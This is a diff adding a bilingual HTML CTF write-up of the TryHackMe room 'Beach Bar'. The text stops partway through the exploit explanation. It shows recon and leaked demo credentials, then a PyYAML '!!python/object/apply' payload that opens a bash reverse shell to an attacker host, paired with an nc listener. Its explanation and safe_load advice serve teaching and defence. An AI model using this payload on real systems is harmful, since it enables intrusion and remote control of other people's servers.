@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="it" id="html-root">
+<head>
+  <meta charset="UTF-8"/>
+  <!-- flag trattenuta fino a fine evento: nessun valore reale in questo file -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; connect-src 'self';"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title data-it="Beach Bar: RCE PyYAML unsafe load — NonèCostanzo" data-en="Beach Bar: PyYAML unsafe load RCE — NonèCostanzo">Beach Bar: RCE PyYAML unsafe load — NonèCostanzo</title>
+  <meta name="description" data-it="Writeup TryHackMe Beach Bar (Boot2root): RCE via PyYAML unsafe load nell'import playlist YAML, reverse shell come bartender e privesc a root con ps aux." data-en="TryHackMe Beach Bar writeup (Boot2root): RCE via PyYAML unsafe load in the YAML playlist import, reverse shell as bartender and root privesc via ps aux." content="Writeup TryHackMe Beach Bar (Boot2root): RCE via PyYAML unsafe load nell'import playlist YAML, reverse shell come bartender e privesc a root con ps aux."/>
+  <link rel="canonical" href="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/beach-bar/"/>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;600;700&family=Barlow+Condensed:wght@700;900&display=swap" rel="stylesheet"/>
+<style>
+    :root{--orange:#ff6a00;--orange-faint:rgba(255,106,0,0.06);--black:#080808;--surface:#101010;--surface2:#161616;--border:#222;--text:#e8e8e8;--muted:#666;--mono:'Share Tech Mono',monospace;--sans:'Barlow',sans-serif;--condensed:'Barlow Condensed',sans-serif}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{background:var(--black);color:var(--text);font-family:var(--sans);font-weight:300;line-height:1.7;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+    header{position:sticky;top:0;z-index:100;background:rgba(8,8,8,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+    .header-inner{max-width:960px;margin:0 auto;padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+    .back-link{font-family:var(--mono);font-size:0.75rem;color:var(--muted);letter-spacing:0.1em;transition:color 0.2s;display:flex;align-items:center;gap:0.5rem}
+    .back-link:hover{color:var(--orange)}
+    .logo{font-family:var(--mono);font-size:0.85rem}
+    .logo .dim{color:#fff}.logo .name{color:var(--orange)}
+    .article-header{max-width:960px;margin:0 auto;padding:4rem 2rem 3rem;border-bottom:1px solid var(--border)}
+    .article-meta{display:flex;align-items:center;gap:1.5rem;margin-bottom:2rem;flex-wrap:wrap}
+    .tag{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;border:1px solid var(--orange);padding:0.2rem 0.6rem}
+    .meta-item{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em}
+    .difficulty-badge{font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;display:flex;align-items:center;gap:0.4rem}
+    .dot{width:6px;height:6px;border-radius:50%}
+    h1{font-family:var(--condensed);font-size:clamp(2rem,5vw,3.5rem);font-weight:900;text-transform:uppercase;letter-spacing:-0.01em;line-height:1.05;color:var(--text);margin-bottom:1.5rem}
+    .article-intro{font-size:1.1rem;color:var(--muted);max-width:760px;line-height:1.8}
+    .article-body{max-width:960px;margin:0 auto;padding:3rem 2rem 5rem}
+    .article-body h2{font-family:var(--condensed);font-size:1.6rem;font-weight:700;text-transform:uppercase;letter-spacing:0.04em;color:var(--text);margin:3rem 0 1rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border)}
+    .article-body h3{font-family:var(--condensed);font-size:1.2rem;font-weight:700;color:var(--orange);text-transform:uppercase;letter-spacing:0.06em;margin:2rem 0 0.75rem}
+    .article-body p{font-size:1rem;color:#bbb;line-height:1.85;margin-bottom:1.25rem}
+    .article-body strong{color:var(--text);font-weight:600}
+    .article-body em{color:var(--muted);font-style:italic}
+    .article-body ul,.article-body ol{margin:1rem 0 1.25rem 1.5rem}
+    .article-body li{font-size:1rem;color:#bbb;line-height:1.8;margin-bottom:0.4rem}
+    .code-block{background:#0a0a0a;border:1px solid var(--border);border-left:3px solid var(--orange);padding:1.5rem;margin:1.5rem 0;overflow-x:auto}
+    .code-block pre{font-family:var(--mono);font-size:0.78rem;color:var(--orange);line-height:1.8;white-space:pre}
+    .code-block .comment{color:var(--muted)}
+    .code-block .danger{color:#ff3333}
+    .code-block .ok{color:#00ff88}
+    .code-block .neutral{color:#aaa}
+    .code-block .warn{color:#ffaa00}
+    .callout{background:var(--orange-faint);border:1px solid rgba(255,106,0,0.25);border-left:3px solid var(--orange);padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-label{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-red{background:rgba(255,51,51,0.04);border:1px solid rgba(255,51,51,0.2);border-left:3px solid #ff3333;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-red .callout-label{font-family:var(--mono);font-size:0.65rem;color:#ff5555;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-red p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-green{background:rgba(0,255,136,0.03);border:1px solid rgba(0,255,136,0.15);border-left:3px solid #00ff88;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-green .callout-label{font-family:var(--mono);font-size:0.65rem;color:#00ff88;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-green p{font-size:0.9rem;color:var(--text);margin:0}
+    .tldr{background:var(--surface2);border:1px solid var(--border);padding:2rem;margin-bottom:3rem}
+    .tldr-label{font-family:var(--mono);font-size:0.7rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:1rem}
+    .tldr ul{margin-left:1.25rem}
+    .tldr li{font-size:0.9rem;color:var(--text);line-height:1.7;margin-bottom:0.4rem}
+    .tldr p{font-size:0.88rem;color:var(--muted);margin:1rem 0 0;line-height:1.7}
+    table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-family:var(--mono);font-size:0.78rem}
+    th{text-align:left;color:var(--orange);padding:0.6rem 0.75rem;border-bottom:1px solid var(--border);letter-spacing:0.1em;text-transform:uppercase}
+    td{padding:0.55rem 0.75rem;border-bottom:1px solid #1a1a1a;color:#bbb;vertical-align:top}
+    td.ok{color:#00ff88}
+    td.danger{color:#ff5555}
+    td.warn{color:#ffaa00}
+    td strong{color:var(--text)}
+    tr:last-child td{border-bottom:none}
+    .article-footer{border-top:1px solid var(--border);padding:2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+    .article-footer a{font-family:var(--mono);font-size:0.75rem;color:var(--orange);letter-spacing:0.1em;transition:opacity 0.2s}
+    .footer-copy{font-family:var(--mono);font-size:0.65rem;color:var(--muted);opacity:0.5}
+    @media(max-width:768px){h1{font-size:2rem}table{font-size:0.7rem}}
+    .lang-toggle{display:flex;border:1px solid var(--border);overflow:hidden;flex-shrink:0}
+    .lang-btn{font-family:var(--mono);font-size:0.65rem;padding:0.3rem 0.6rem;background:transparent;color:var(--muted);border:none;cursor:pointer;letter-spacing:0.08em;text-transform:uppercase;transition:all .2s}
+    .lang-btn.active{background:var(--orange);color:var(--black)}
+    .lang-btn:hover:not(.active){color:var(--orange)}
+    #read-bar{position:fixed;top:0;left:0;height:2px;width:0%;background:var(--orange);z-index:200;transition:width .08s linear;pointer-events:none}
+    #back-top{position:fixed;bottom:1.75rem;right:1.75rem;font-family:var(--mono);font-size:0.6rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);background:var(--surface);border:1px solid var(--border);padding:0.45rem 0.7rem;cursor:pointer;opacity:0;pointer-events:none;transition:opacity .25s,color .2s,border-color .2s;z-index:150}
+    #back-top.vis{opacity:1;pointer-events:all}
+    #back-top:hover{color:var(--orange);border-color:var(--orange)}
+    .share-wrap{max-width:960px;margin:0 auto;padding:1.5rem 2rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap;border-top:1px solid var(--border)}
+    .share-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase;flex-shrink:0}
+    .share-btns{display:flex;gap:0.4rem;flex-wrap:wrap}
+    .share-btn{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.08em;color:var(--muted);border:1px solid var(--border);padding:0.3rem 0.65rem;background:transparent;cursor:pointer;transition:color .2s,border-color .2s;text-decoration:none;display:inline-block}
+    .share-btn:hover{color:var(--orange);border-color:var(--orange)}
+    .share-btn.ok{color:#00ff88;border-color:#00ff88}
+    .auth-wrap{display:flex;align-items:center;gap:0.5rem}
+    .auth-bar{width:44px;height:3px;background:var(--border);overflow:hidden;flex-shrink:0}
+    .auth-human{height:100%;background:var(--orange)}
+    .auth-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.08em}
+    .cve-badge{display:inline-block;font-family:var(--mono);font-size:0.7rem;background:rgba(255,51,51,0.08);border:1px solid rgba(255,51,51,0.3);color:#ff5555;padding:0.3rem 0.75rem;letter-spacing:0.05em;margin:0.5rem 0}
+    .lang-en{display:none}
+      /* AUTHOR BOX */
+    .author-box{max-width:760px;margin:3.5rem auto 0;padding:1.75rem;background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--orange)}
+    .author-box .ab-label{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase}
+    .author-box .ab-name{font-family:var(--condensed);font-weight:900;font-size:1.5rem;text-transform:uppercase;color:var(--text);letter-spacing:0.02em;margin-top:0.5rem;line-height:1}
+    .author-box .ab-role{font-family:var(--mono);font-size:0.68rem;color:var(--orange);margin-top:0.45rem;line-height:1.6}
+    .author-box .ab-bio{font-size:0.9rem;color:var(--muted);line-height:1.65;margin-top:0.9rem}
+    .author-box .ab-links{display:flex;flex-wrap:wrap;gap:0.6rem;margin-top:1.2rem;align-items:center}
+    .author-box .ab-links a{font-family:var(--mono);font-size:0.68rem;color:var(--muted);border:1px solid var(--border);padding:0.4rem 0.8rem;letter-spacing:0.08em;transition:border-color .2s,color .2s}
+    .author-box .ab-links a:hover{border-color:var(--orange);color:var(--orange)}
+    .author-box .ab-links a.ab-cta{color:var(--orange);border-color:var(--orange)}
+    .author-box .ab-links a.ab-cta:hover{background:var(--orange);color:var(--black)}
+    @media(max-width:600px){.author-box{margin:2.5rem 1.25rem 0;padding:1.25rem}}
+</style>
+
+  <style>
+    .article-body code,.tldr code,.callout code,.callout-red code,.callout-green code{font-family:var(--mono);color:var(--orange)}
+    .redaction{font-family:var(--mono);color:var(--orange);letter-spacing:2px}
+    .crumb{max-width:960px;margin:0 auto;padding:1rem 2rem 0;font-family:var(--mono);font-size:0.66rem;color:#5f5f5f;letter-spacing:0.08em}
+    .crumb a{color:var(--muted)}.crumb a:hover{color:var(--orange)}.crumb .here{color:var(--orange)}
+    .meme-tag{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;border:1px dashed var(--border);padding:0.25rem 0.6rem}
+  </style>
+  <meta property="og:type" content="article"/>
+  <meta property="og:site_name" content="NonèCostanzo — Paolo Costanzo"/>
+  <meta property="og:title" data-it="Beach Bar: RCE PyYAML unsafe load — NonèCostanzo" data-en="Beach Bar: PyYAML unsafe load RCE — NonèCostanzo" content="Beach Bar: RCE PyYAML unsafe load — NonèCostanzo"/>
+  <meta property="og:description" data-it="Writeup TryHackMe Beach Bar (Boot2root): RCE via PyYAML unsafe load nell'import playlist YAML, reverse shell come bartender e privesc a root con ps aux." data-en="TryHackMe Beach Bar writeup (Boot2root): RCE via PyYAML unsafe load in the YAML playlist import, reverse shell as bartender and root privesc via ps aux." content="Writeup TryHackMe Beach Bar (Boot2root): RCE via PyYAML unsafe load nell'import playlist YAML, reverse shell come bartender e privesc a root con ps aux."/>
+  <meta property="og:url" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/beach-bar/"/>
+  <meta property="og:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/beach-bar/og.png"/>
+  <meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/>
+  <meta property="og:image:alt" content="Beach Bar — CTF walkthrough"/>
+  <meta property="og:locale" data-it="it_IT" data-en="en_US" content="it_IT"/>
+  <meta property="article:published_time" content="2026-07-31T09:00:00+02:00"/>
+  <meta property="article:modified_time" content="2026-07-31T09:00:00+02:00"/>
+  <meta property="article:author" content="https://www.paolocostanzo.com"/>
+  <meta property="article:section" content="CTF"/>
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" data-it="Beach Bar: RCE PyYAML unsafe load — NonèCostanzo" data-en="Beach Bar: PyYAML unsafe load RCE — NonèCostanzo" content="Beach Bar: RCE PyYAML unsafe load — NonèCostanzo"/>
+  <meta name="twitter:description" data-it="Writeup TryHackMe Beach Bar (Boot2root): RCE via PyYAML unsafe load nell'import playlist YAML, reverse shell come bartender e privesc a root con ps aux." data-en="TryHackMe Beach Bar writeup (Boot2root): RCE via PyYAML unsafe load in the YAML playlist import, reverse shell as bartender and root privesc via ps aux." content="Writeup TryHackMe Beach Bar (Boot2root): RCE via PyYAML unsafe load nell'import playlist YAML, reverse shell come bartender e privesc a root con ps aux."/>
+  <meta name="twitter:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/beach-bar/og.png"/>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"TechArticle",
+  "headline":"Beach Bar: RCE PyYAML unsafe load",
+  "description":"Writeup TryHackMe Beach Bar (Boot2root): RCE via PyYAML unsafe load nell'import playlist YAML, reverse shell come bartender e privesc a root con ps aux.",
+  "image":["https://paolocostanzo.github.io/ctf/hacker-holidays-2026/beach-bar/og.png"],"datePublished":"2026-07-31T09:00:00+02:00","dateModified":"2026-07-31T09:00:00+02:00","inLanguage":"it","articleSection":"CTF",
+  "keywords":"TryHackMe, Hacker Holidays 2026, Beach Bar, Boot2root, TryHackMe, CTF walkthrough",
+  "mainEntityOfPage":{"@type":"WebPage","@id":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/beach-bar/"},"url":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/beach-bar/",
+  "author":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com","sameAs":["https://www.linkedin.com/in/paolocostanzoit/","https://github.com/paolocostanzo","https://www.researchgate.net/profile/Paolo-Costanzo-2"]},
+  "publisher":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com"},
+  "about":{"@type":"Thing","name":"TryHackMe — Beach Bar"}
+}
+  </script>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[
+    {"@type":"ListItem","position":1,"name":"CTF","item":"https://paolocostanzo.github.io/ctf/"},
+    {"@type":"ListItem","position":2,"name":"Hacker Holidays 2026","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/"},
+    {"@type":"ListItem","position":3,"name":"Beach Bar","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/beach-bar/"}
+  ]
+}
+  </script>
+</head>
+
+<body>
+  <div id="read-bar"></div>
+  <header>
+    <div class="header-inner">
+      <a class="back-link" href="/ctf/hacker-holidays-2026/" data-it="← Hacker Holidays 2026" data-en="← Hacker Holidays 2026">← Hacker Holidays 2026</a>
+      <div class="logo"><span class="dim">nonè@</span><span class="name">costanzo</span><span class="dim">:~$</span></div>
+      <div class="lang-toggle">
+        <button class="lang-btn active" onclick="setLang('it')" aria-pressed="true">IT</button>
+        <button class="lang-btn" onclick="setLang('en')" aria-pressed="false">EN</button>
+      </div>
+    </div>
+  </header>
+  <nav class="crumb" aria-label="breadcrumb"><a href="/ctf/">CTF</a> / <a href="/ctf/hacker-holidays-2026/">Hacker Holidays 2026</a> / <span class="here">Beach Bar</span></nav>
+  <main>
+  <article>
+  <div class="article-header">
+    <div class="article-meta">
+      <span class="tag">Boot2root</span><span class="tag">TryHackMe</span>
+      <span class="tag">TryHackMe</span>
+      <time class="meta-item" datetime="2026-07-31" data-it="31 Lug 2026" data-en="31 Jul 2026">31 Lug 2026</time>
+      <span class="meta-item" data-it="6 min di lettura" data-en="6 min read">6 min di lettura</span>
+      <span class="difficulty-badge" style="color:#00ff88"><span class="dot" style="background:#00ff88"></span><span>Easy</span></span>
+      <span class="meme-tag" data-it="// importa la playlist, esporta la shell" data-en="// import the playlist, export the shell">// importa la playlist, esporta la shell</span>
+    </div>
+    <h1 data-it="Beach Bar — dal jukebox YAML alla root" data-en="Beach Bar — from the YAML jukebox to root">Beach Bar — dal jukebox YAML alla root</h1>
+    <p class="article-intro" data-it="Byte Lotus, spiaggia, un jukebox web che accetta richieste da chiunque abbia un telefono. Il DJ però ha lasciato in giro più della musica: una login demo ancora accesa e una feature che si fida troppo del mio YAML. In questa room passo dal &lt;code&gt;view-source&lt;/code&gt; a una reverse shell come &lt;strong&gt;bartender&lt;/strong&gt;, e da un processo troppo loquace alla root. Boot2root da manuale, con due lezioni che vedo ancora in produzione." data-en="Byte Lotus, a beach, a web jukebox that takes requests from anyone with a phone. The DJ left behind more than music though: a demo login still switched on and a feature that trusts my YAML far too much. In this room I go from &lt;code&gt;view-source&lt;/code&gt; to a reverse shell as &lt;strong&gt;bartender&lt;/strong&gt;, and from a too-talkative process to root. A textbook Boot2root, with two lessons I still see in production.">Byte Lotus, spiaggia, un jukebox web che accetta richieste da chiunque abbia un telefono. Il DJ però ha lasciato in giro più della musica: una login demo ancora accesa e una feature che si fida troppo del mio YAML. In questa room passo dal <code>view-source</code> a una reverse shell come <strong>bartender</strong>, e da un processo troppo loquace alla root. Boot2root da manuale, con due lezioni che vedo ancora in produzione.</p>
+  </div>
+  <div class="article-body">
+
+    <div class="tldr">
+      <div class="tldr-label" data-it="// TL;DR" data-en="// TL;DR">// TL;DR</div>
+      <ul><li data-it="Recon: solo SSH e HTTP (&lt;strong&gt;gunicorn&lt;/strong&gt;); il web è l'unica via." data-en="Recon: only SSH and HTTP (&lt;strong&gt;gunicorn&lt;/strong&gt;); the web app is the only way in.">Recon: solo SSH e HTTP (<strong>gunicorn</strong>); il web è l'unica via.</li><li data-it="Login demo &lt;code&gt;dj/dj&lt;/code&gt; lasciata nel &lt;code&gt;view-source&lt;/code&gt;." data-en="Demo &lt;code&gt;dj/dj&lt;/code&gt; login left in the &lt;code&gt;view-source&lt;/code&gt;.">Login demo <code>dj/dj</code> lasciata nel <code>view-source</code>.</li><li data-it="Import playlist usa &lt;code&gt;yaml.load&lt;/code&gt; unsafe → RCE con &lt;code&gt;!!python/object/apply&lt;/code&gt;." data-en="Playlist import uses unsafe &lt;code&gt;yaml.load&lt;/code&gt; → RCE via &lt;code&gt;!!python/object/apply&lt;/code&gt;.">Import playlist usa <code>yaml.load</code> unsafe → RCE con <code>!!python/object/apply</code>.</li><li data-it="Reverse shell come &lt;strong&gt;bartender&lt;/strong&gt;, poi &lt;code&gt;ps aux&lt;/code&gt; rivela la password di root." data-en="Reverse shell as &lt;strong&gt;bartender&lt;/strong&gt;, then &lt;code&gt;ps aux&lt;/code&gt; leaks the root password.">Reverse shell come <strong>bartender</strong>, poi <code>ps aux</code> rivela la password di root.</li><li data-it="Difesa: &lt;code&gt;safe_load&lt;/code&gt; e mai segreti negli argomenti CLI." data-en="Defense: &lt;code&gt;safe_load&lt;/code&gt; and never secrets in CLI args.">Difesa: <code>safe_load</code> e mai segreti negli argomenti CLI.</li></ul>
+    </div>
+
+    <h2 data-it="[01] Ricognizione e superficie" data-en="[01] Recon and attack surface" id='recon'>[01] Ricognizione e superficie</h2>
+    <p data-it="L'IP della macchina va dritto nel browser: si apre «Beach Bar // Sign in», una web app su porta 80. In parallelo lancio &lt;code&gt;nmap&lt;/code&gt; per capire con cosa ho a che fare." data-en="The machine IP goes straight into the browser: up comes &quot;Beach Bar // Sign in&quot;, a web app on port 80. In parallel I fire &lt;code&gt;nmap&lt;/code&gt; to see what I'm dealing with.">L'IP della macchina va dritto nel browser: si apre «Beach Bar // Sign in», una web app su porta 80. In parallelo lancio <code>nmap</code> per capire con cosa ho a che fare.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># superficie minima: due porte e via</span>
+<span class="neutral">nmap -sC -sV -p- &lt;target&gt; -oN nmap.txt</span>
+<span class="comment"># 22/tcp open  ssh</span>
+# 80/tcp open  http    <span class="warn">gunicorn</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># minimal surface: two ports and that's it</span>
+<span class="neutral">nmap -sC -sV -p- &lt;target&gt; -oN nmap.txt</span>
+<span class="comment"># 22/tcp open  ssh</span>
+# 80/tcp open  http    <span class="warn">gunicorn</span></pre>
+</div></div>
+    <p data-it="Due porte in tutto: SSH e un HTTP servito da &lt;strong&gt;gunicorn&lt;/strong&gt;. Superficie d'attacco minuscola, il che è quasi un suggerimento: la via d'ingresso è il web." data-en="Two ports total: SSH and an HTTP served by &lt;strong&gt;gunicorn&lt;/strong&gt;. A tiny attack surface, which is almost a hint in itself: the way in is the web app.">Due porte in tutto: SSH e un HTTP servito da <strong>gunicorn</strong>. Superficie d'attacco minuscola, il che è quasi un suggerimento: la via d'ingresso è il web.</p>
+
+    <h2 data-it="[02] Il login che nessuno ha spento" data-en="[02] The login nobody turned off" id='access'>[02] Il login che nessuno ha spento</h2>
+    <p data-it="Prima regola, sempre valida: guardo il sorgente della pagina di login. E infatti lo sviluppatore ha dimenticato qualcosa." data-en="First rule, always worth it: I read the login page source. And sure enough, the developer forgot something.">Prima regola, sempre valida: guardo il sorgente della pagina di login. E infatti lo sviluppatore ha dimenticato qualcosa.</p>
+    <div class="callout">
+  <div class="callout-label" data-it="// nota" data-en="// note">// nota</div>
+  <p data-it="Nel &lt;code&gt;view-source&lt;/code&gt; del login, un regalo: «staff note: demo DJ login still enabled for the soft opening — dj / dj, swap before the season (ticket BAR-7)». Un commento così nel sorgente è la chiave sotto lo zerbino." data-en="In the login's &lt;code&gt;view-source&lt;/code&gt;, a gift: &quot;staff note: demo DJ login still enabled for the soft opening — dj / dj, swap before the season (ticket BAR-7)&quot;. A comment like that in the source is the key under the doormat.">Nel <code>view-source</code> del login, un regalo: «staff note: demo DJ login still enabled for the soft opening — dj / dj, swap before the season (ticket BAR-7)». Un commento così nel sorgente è la chiave sotto lo zerbino.</p>
+</div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># credenziali demo ancora vive → dashboard DJ</span>
+<span class="neutral">dj / dj</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># demo creds still alive → DJ dashboard</span>
+<span class="neutral">dj / dj</span></pre>
+</div></div>
+    <p data-it="Dentro, una dashboard DJ per «il set di stasera» con due pulsanti interessanti: &lt;strong&gt;Export&lt;/strong&gt; e &lt;strong&gt;Import&lt;/strong&gt; di una playlist in formato YAML. Faccio prima Export per vedere il formato." data-en="Inside, a DJ dashboard for &quot;tonight's set&quot; with two interesting buttons: &lt;strong&gt;Export&lt;/strong&gt; and &lt;strong&gt;Import&lt;/strong&gt; of a playlist as YAML. I hit Export first to learn the format.">Dentro, una dashboard DJ per «il set di stasera» con due pulsanti interessanti: <strong>Export</strong> e <strong>Import</strong> di una playlist in formato YAML. Faccio prima Export per vedere il formato.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># formato playlist restituito da Export</span>
+<span class="neutral">playlist:</span>
+<span class="neutral">  name: Sunset Session</span>
+<span class="neutral">  vibe: golden hour</span>
+<span class="neutral">  tracks:</span>
+<span class="neutral">    - artist: Khruangbin</span>
+<span class="neutral">      title: Maria Tambien</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># playlist format returned by Export</span>
+<span class="neutral">playlist:</span>
+<span class="neutral">  name: Sunset Session</span>
+<span class="neutral">  vibe: golden hour</span>
+<span class="neutral">  tracks:</span>
+<span class="neutral">    - artist: Khruangbin</span>
+<span class="neutral">      title: Maria Tambien</span></pre>
+</div></div>
+
+    <h2 data-it="[03] RCE via PyYAML unsafe load" data-en="[03] RCE via PyYAML unsafe load" id='exploit'>[03] RCE via PyYAML unsafe load</h2>
+    <p data-it="Una feature che accetta YAML grezzo da un utente autenticato è esattamente il tipo di cosa da testare per l'esecuzione di codice. Apro un listener — ricordandomi di aprire la porta sulla VPN, altrimenti la shell non torna indietro." data-en="A feature that eats raw YAML from a logged-in user is exactly the kind of thing to test for code execution. I open a listener — remembering to open the port on the VPN, or the shell never comes back.">Una feature che accetta YAML grezzo da un utente autenticato è esattamente il tipo di cosa da testare per l'esecuzione di codice. Apro un listener — ricordandomi di aprire la porta sulla VPN, altrimenti la shell non torna indietro.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># apri PRIMA la porta sulla VPN, poi ascolta</span>
+<span class="neutral">sudo ufw allow 4444/tcp   # se hai un firewall locale</span>
+<span class="neutral">nc -lvnp 4444</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># open the port on the VPN FIRST, then listen</span>
+<span class="neutral">sudo ufw allow 4444/tcp   # if you run a local firewall</span>
+<span class="neutral">nc -lvnp 4444</span></pre>
+</div></div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># incollato nel box Import playlist</span>
+<span class="neutral">playlist:</span>
+  name: <span class="danger">!!python/object/apply:subprocess.check_output</span> [["bash","-c","bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1"]]
+<span class="neutral">  tracks: []</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># pasted into the Import playlist box</span>
+<span class="neutral">playlist:</span>
+  name: <span class="danger">!!python/object/apply:subprocess.check_output</span> [["bash","-c","bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1"]]
+<span class="neutral">  tracks: []</span></pre>
+</div></div>
+    <p data-it="Perché funziona: l'app deserializza il YAML con un &lt;strong&gt;loader non sicuro&lt;/strong&gt; (&lt;code&gt;yaml.load(...)&lt;/code&gt; con Loader=yaml.Loader/UnsafeLoader, oppure &lt;code&gt;yaml.unsafe_load()&lt;/code&gt;): quel loader &lt;em&gt;ricostruisce oggetti Python arbitrari&lt;/em&gt;. Nelle versioni recenti di PyYAML, &lt;code&gt;yaml.load()&lt;/code&gt; senza Loader esplicito solleva un errore apposta per impedirlo — qui quella salvaguardia è stata scavalcata. Il tag &lt;code&gt;!!python/object/apply&lt;/code&gt; non è «YAML injection»: è un vero gadget di deserializzazione che invoca un callable — qui &lt;code&gt;subprocess.check_output&lt;/code&gt; — durante il parsing. È lo stesso pattern di &lt;code&gt;pickle&lt;/code&gt;, del &lt;code&gt;readObject&lt;/code&gt; in Java o di &lt;code&gt;unserialize&lt;/code&gt; in PHP: se il formato ricostruisce oggetti, chi controlla i dati controlla il codice." data-en="Why it works: the app deserializes the YAML with an &lt;strong&gt;unsafe loader&lt;/strong&gt; (&lt;code&gt;yaml.load(...)&lt;/code&gt; with Loader=yaml.Loader/UnsafeLoader, or &lt;code&gt;yaml.unsafe_load()&lt;/code&gt;): that loader &lt;em&gt;reconstructs arbitrary Python objects&lt;/em&gt;. In recent PyYAML, &lt;code&gt;yaml.load()&lt;/code&gt; without an explicit Loader raises an error precisely to prevent this — here that safeguard was bypassed. The &lt;code&gt;!!python/object/apply&lt;/code&gt; tag isn't &quot;YAML injection&quot;: it's a genuine deserialization gadget that invokes a callable — here &lt;code&gt;subprocess.check_output&lt;/code&gt; — during parsing. Same pattern as &lt;code&gt;pickle&lt;/code&gt;, Java's &lt;code&gt;readObject&lt;/code&gt; or PHP's &lt;code&gt;unserialize&lt;/code&gt;: if the format rebuilds objects, whoever controls the data controls the code.">Perché funziona: l'app deserializza il YAML con un <strong>loader non sicuro</strong> (<code>yaml.load(...)</code> con Loader=yaml.Loader/UnsafeLoader, oppure <code>yaml.unsafe_load()</code>): quel loader <em>ricostruisce oggetti Python arbitrari</em>. Nelle versioni recenti di PyYAML, <code>yaml.load()</code> senza Loader esplicito solleva un errore apposta per impedirlo — qui quella salvaguardia è stata scavalcata. Il tag <code>!!python/object/apply</code> non è «YAML injection»: è un vero gadget di deserializzazione che invoca un callable — qui <code>subprocess.check_output</code> — durante il parsing. È lo stesso pattern di <code>pickle</code>, del <code>readObject</code> in Java o di <code>unserialize</code> in PHP: se il formato ricostruisce oggetti, chi controlla i dati controlla il codice.</p>
